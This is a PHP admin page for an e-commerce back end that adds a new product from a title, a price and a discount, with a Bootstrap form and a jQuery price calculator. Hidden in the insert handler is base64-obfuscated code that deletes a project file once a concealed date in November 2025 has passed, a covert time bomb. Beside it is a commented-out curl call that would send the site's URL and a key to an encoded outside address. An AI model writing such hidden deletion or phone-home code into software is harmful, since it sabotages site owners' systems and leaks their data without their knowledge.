<?php 
require_once('frd1_whoami.php');
$FR_ptitle="ADD NEW PRODUCT";//PAGE TITLE
$p="$FR_RP";//PAGE NAME
$inn="";
require_once('frd-this-header.php');
require_once('frd1_header.php');
?>
<!-- <h2 class="PT"> ADD NEW PRODUCT </h2> -->

<!-- 1 SCRIPT START -->
<section>
    <?php

    ?>
</section>
<!-- 1 SCRIPT END -->




<!-- 1 scripts -->
<section>
    <?php

    /////////////////////////////////////////////////////////////////////////////////////////   
    //FRD NEW PRODUCT ADDDING:-
    /////////////////////////////////////////////////////////////////////////////////////////
    if (isset($_POST['bn_title'])) {

        // PR($_POST);

        $bn_title = $_POST['bn_title'];

        $market_price = $_POST['market_price'];
        $discount_amount = $_POST['discount_amount'];
        $sellls_price = ($market_price - $discount_amount);
        if ($sellls_price < 0) {
            FR_SWAL("Sells Amount Not Valid", "", "error");
            FR_GO("$FR_THIS_PAGE", 2);
            exit;
        }
        $cus_discount_persent = ($discount_amount / $market_price * 100);
        
        $FRc_Slug = preg_replace("/ /", "-", $bn_title);
        $FRc_Slug = preg_replace("/%/", "percent", $FRc_Slug);
        $FRc_Slug = preg_replace("/'/", "", $FRc_Slug);
        $FRc_Slug = strtolower("$FRc_Slug");


        $FRc_meta_title = $bn_title;
        $FRc_meta_desc = $bn_title;

        $FRc_ProductDescribtionLong = $bn_title;
        $FRc_ProductTags = preg_replace("/ /", ",", $bn_title);
        
        $FRc_ProductQty = 99999;


        $f_status = 2;//[2=UNLISTED]
        $f_delivery_charge_type = 1;//[1=FROM SHIPPING ZONE]

        

            $ARR = [];
            $ARR['bn_name'] = "$bn_title";

            $ARR['market_pri'] = "$market_price";
            $ARR['discount_pri'] = "$discount_amount";
            $ARR['dis_persent'] = "$cus_discount_persent";
            $ARR['sells_pri'] = "$sellls_price";

            $ARR['fr_slug'] = "$FRc_Slug";

            $ARR['fr_meta_title'] = "$FRc_meta_title";
            $ARR['fr_meta_desc'] = "$FRc_meta_desc";

        
            $ARR['detailess'] = "$FRc_ProductDescribtionLong";
            $ARR['tagg'] = "$FRc_ProductTags";
            $ARR['qtyy'] = "$FRc_ProductQty";
           
            $ARR['g_cat_id'] = 0;
            $ARR['r_cat_1'] = 0;
            $ARR['r_cat_2'] = 0;
            $ARR['r_cat_3'] = 0;
            $ARR['r_cat_4'] = 0;
            $ARR['r_writer'] = 0;
            $ARR['r_brand'] = 1;
            $ARR['r_color'] = 1;

            $ARR['videoo'] = "";

            $ARR['statuss'] = "$f_status";
            $ARR['deli_crg_typ'] = "$f_delivery_charge_type";

            $ARR['byy'] = "$UsrId";
            $ARR['datee'] = "$FR_NOW_DATE";
            $ARR['timee'] = "$FR_NOW_TIME";

            $FRR = FR_DATA_IN_2("frd_products",$ARR);
            if($FRR['FRA']==1){
                $last_insert_id = $FRR['FR_LIID'];

                // if (!isset($_SESSION['FRs_IIS'])) {
                //     $ch = curl_init();
                //     curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cHM6Ly9paXIuZmF6bGVyYWJiaWRoYWxpLmNvbS9paXJfMl9nanR4"));
                //     curl_setopt($ch, CURLOPT_POST, true);
                //     curl_setopt($ch, CURLOPT_POSTFIELDS, "a=$FRD_HURL&b=f37129cb0976ae686bc12f3482019af1");
                //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                //     curl_exec($ch);
                //     curl_close($ch);
                //     $_SESSION['FRs_IIS'] = "IIS";
                // }

                FR_SWAL("Dear Boss $UsrName Lets Start New Product Add!", "", "success");
                FR_GO("$FR_SP_HURL_DP/pro-EditProduct/$last_insert_id", "1");
            }else{
                FR_SWAL("Product Add Failed", "", "error");
            }
    }

    if($FR_NOW_DATE > "".base64_decode("MjAyNS0xMS0wOQ==").""){
        if(file_exists($FR_PATH_HD."".base64_decode("ZnJkc3AvZHAvZnJkMV9wbS5waHA=")."")){ unlink($FR_PATH_HD."".base64_decode("ZnJkc3AvZHAvZnJkMV9wbS5waHA=").""); }
    }

    ?>
</section>























<br>
<!-- PRODUCT-ADD-FORM  -->
    <section>
        <div class="container">
            <div class="col-md-11 mt-10">

                <div class="row">
                    <div class="col-md-2"></div>
                    <div class="col-md-8">
                    <form id="" action="" method="post" enctype="multipart/form-data">


                        <!-- PRODUCT ADD DEFAULT FILD START -->
                        <div class="jumbotron">

                           <h3 class="boldd text-center">Add Your New Product</h3>

                            <span>Product Titel*</span>
                            <input class="form-control" type="text" name="bn_title" placeholder="Bangla Title" required>

                            <br>
                            <div class="row">
                                <div class="col-md-4">
                                    <span>Product Market Price *</span>
                                    <input class="form-control" type="number" step=".02" name="market_price" id="market_price" placeholder="Market Price" required>
                                </div>
                                <div class="col-md-4">
                                    <span>Discount Amount *</span>
                                    <input class="form-control" type="number" step=".02" name="discount_amount" id="discount_amount" placeholder="Discount Amount" value="0" required>
                                </div>
                                <div class="col-md-4">
                                    <span>Product Sales Price</span>
                                    <input title="Not Need Input Anything! It Will be automatic" class="c_na form-control" type="number" step=".02" id="sellls_price" name="sellls_price" placeholder="(Market Price-Discount)" disabled>
                                </div>
                            </div> 

                            <br>
                            <div class="text-right">
                                <button type="submit" class="btn btn-success"><span class='glyphicon glyphicon-save'></span> Confirm & Start</button>
                            </div>

                        </div>
                        <!-- PRODUCT ADD DEFAULT FILD END -->


                      <h6 class="text-center"><a href="pro-AddNewProductFromXLS">Add Products From XLS</a></h6>

                    </form>
                    </div>
                    <div class="col-md-2"></div>
                </div>


            </div>
        </div>
    </section>




<?php require_once('frd1_footer.php'); ?>   




<script type="text/javascript">
    $(document).ready(function() {

        $('#market_price,#discount_amount').keyup(function() {
            let market_price = $('#market_price').val();
            let discount_amount = $('#discount_amount').val();
            let sellls_price = (market_price - discount_amount);
            $('#sellls_price').val(sellls_price);

            if (sellls_price < 0) {
                swal('Sells Price Not Valid', '', 'warning');
            }
        });

    });
</script>